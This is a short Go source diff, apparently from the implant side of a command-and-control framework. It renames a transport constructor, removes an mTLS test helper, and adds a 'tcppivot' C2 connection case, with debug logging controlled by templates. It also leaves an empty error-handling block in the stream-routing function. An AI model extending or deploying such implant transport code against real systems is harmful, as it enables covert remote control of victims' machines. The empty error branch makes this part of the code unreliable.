@@ -74,10 +74,10 @@ type Transport struct {
 	Inbound chan net.Conn
 }
 
-// New - Eventually, we should have all supported transport transports being
+// NewTransport - Eventually, we should have all supported transport transports being
 // instantiated with this function. It will perform all filtering and setup
 // according to the complete URI passed as parameter, and classic templating.
-func New(url *url.URL) (t *Transport, err error) {
+func NewTransport(url *url.URL) (t *Transport, err error) {
 	t = &Transport{
 		ID:  newID(),
 		URL: url,
@@ -85,20 +85,6 @@ func New(url *url.URL) (t *Transport, err error) {
 	// {{if .Config.Debug}}
 	log.Printf("New transport (CC= %s)", url.String())
 	// {{end}}
-	return
-}
-
-// For now we test with an mTLS connection and start everything from here.
-func newTransportMTLS(url *url.URL) (t *Transport, err error) {
-	// New
-	t, err = New(url)
-
-	// Start
-	err = t.Start()
-	if err != nil {
-		return
-	}
-
 	return
 }
 
@@ -172,6 +158,24 @@ ConnLoop:
 			}
 			t.IsMux = true
 			// {{end}} -NamePipec2Enabled
+		case "tcppivot":
+			// {{if .Config.TCPPivotc2Enabled}}
+			t.C2, err = tcpPivotConnect(t.URL)
+			if err != nil {
+				// {{if .Config.Debug}}
+				log.Printf("[tcppivot] Connection failed %s", err)
+				// {{end}}
+				connectionAttempts++
+			}
+			t.IsMux = false // For the moment...
+			// {{end}} -TCPPivotc2Enabled
+
+		default:
+			err = fmt.Errorf("Unknown c2 protocol %s", t.URL.Scheme)
+			// {{if .Config.Debug}}
+			log.Printf(err.Error())
+			// {{end}}
+			return
 		}
 	}
 
@@ -380,6 +384,9 @@ func (t *Transport) HandleRouteStream(routeID uint32, src net.Conn) (err error) 
 
 	var route bon.Route = bon.Route(routeID)
 	dst, err := t.Router.Connect(route)
+	if err != nil {
+
+	}
 
 	// {{if .Config.Debug}}
 	log.Printf("[mux] Outbound stream: muxing conn and piping")
